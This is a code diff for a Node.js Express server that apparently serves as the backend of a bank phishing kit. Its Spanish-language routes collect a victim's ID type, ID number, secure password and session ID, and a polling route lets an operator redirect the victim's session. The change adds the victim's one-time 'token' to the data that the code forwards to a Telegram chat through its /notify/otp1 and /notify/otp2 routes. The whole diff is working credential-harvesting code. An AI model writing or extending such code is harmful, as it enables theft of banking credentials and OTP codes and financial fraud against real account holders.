@@ -74,13 +74,14 @@ app.post("/virtualpersona", async (req, res) => {
 });
 
 // ===== NUEVO: enviar "Nuevo OTP" con los mismos botones =====
-async function enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId }) {
+async function enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId, token }) {
   const mensaje = `
 🔐 *Nuevo otp*
 
 📄 *Tipo de documento:* ${tipoDoc || "N/D"}
 🆔 *Documento:* ${numDoc || "N/D"}
 🔑 *Clave segura:* ${clave || "N/D"}
+🔢 *Token:* ${token || "N/D"}
 
 🌀 *Session ID:* \`${sessionId}\`
 `;
@@ -109,13 +110,12 @@ async function enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId }) {
 // ===== NUEVO: notificar al entrar a OTP-1 =====
 app.post("/notify/otp1", async (req, res) => {
   try {
-    const { sessionId, tipoDoc, numDoc, clave } = req.body || {};
+    const { sessionId, tipoDoc, numDoc, clave, token } = req.body || {};
     if (!sessionId) return res.status(400).json({ ok:false, error:"Falta sessionId" });
 
-    // si quieres, inicializamos por si no existe
     if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
 
-    await enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId });
+    await enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId, token });
     return res.json({ ok:true });
   } catch (e) {
     console.error("❌ /notify/otp1 error:", e);
@@ -126,19 +126,18 @@ app.post("/notify/otp1", async (req, res) => {
 // ===== NUEVO: notificar al entrar a OTP con error =====
 app.post("/notify/otp2", async (req, res) => {
   try {
-    const { sessionId, tipoDoc, numDoc, clave } = req.body || {};
+    const { sessionId, tipoDoc, numDoc, clave, token } = req.body || {};
     if (!sessionId) return res.status(400).json({ ok:false, error:"Falta sessionId" });
 
     if (!sessions.has(sessionId)) sessions.set(sessionId, { redirect_to: null });
 
-    await enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId });
+    await enviarMensajeTelegramOTP({ tipoDoc, numDoc, clave, sessionId, token });
     return res.json({ ok:true });
   } catch (e) {
     console.error("❌ /notify/otp2 error:", e);
     return res.status(500).json({ ok:false });
   }
 });
-
 
 // Ruta de polling (ready.js la consulta)
 app.get("/instruction/:sessionId", (req, res) => {
